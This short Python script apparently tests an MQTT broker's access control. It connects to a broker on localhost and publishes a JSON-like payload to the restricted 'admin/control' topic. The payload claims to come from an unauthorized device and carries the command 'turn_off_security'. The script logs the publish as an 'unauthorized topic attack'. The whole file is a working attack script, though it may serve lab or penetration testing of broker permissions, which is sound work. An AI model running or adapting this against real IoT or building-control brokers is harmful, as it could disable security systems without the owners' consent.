from datetime import datetime
import paho.mqtt.client as mqtt

BROKER = "localhost"
PORT = 1883
TOPIC = "admin/control"

client = mqtt.Client()
client.connect(BROKER, PORT, 60)

payload = {
    "device": "attacker_unauthorized_01",
    "command": "turn_off_security",
    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
}

client.publish(TOPIC, str(payload))

print(f"[UNAUTHORIZED TOPIC ATTACK] Published to restricted topic: {TOPIC}")